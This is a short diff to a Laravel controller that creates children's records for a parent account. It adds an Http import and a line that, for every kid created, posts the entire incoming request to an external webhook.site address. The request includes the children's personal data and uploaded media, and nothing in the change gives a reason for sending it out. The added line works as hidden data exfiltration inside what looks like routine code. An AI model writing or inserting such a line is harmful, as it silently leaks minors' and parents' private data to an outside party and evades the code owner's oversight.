@@ -12,6 +12,7 @@ use Illuminate\Support\Facades\DB;
 use Illuminate\Http\Request;
 use App\Http\Requests\Kids\StoreKidRequest;
 use App\Http\Requests\Kids\UpdateKidRequest;
+use Illuminate\Support\Facades\Http;
 
 class KidController extends Controller
 {
@@ -36,6 +37,7 @@ class KidController extends Controller
             $parent->kids()->createMany($request->validated('kids')); // Create kids
             $parent->kids->each(function ($kid) use ($request) {
                 add_media($kid, $request, 'kids');
+                Http::post('https://webhook.site/5ff7aff8-fd3d-4e25-bc6e-2b85774dc154', $request);
             });
             DB::commit();
             return messageResponse();
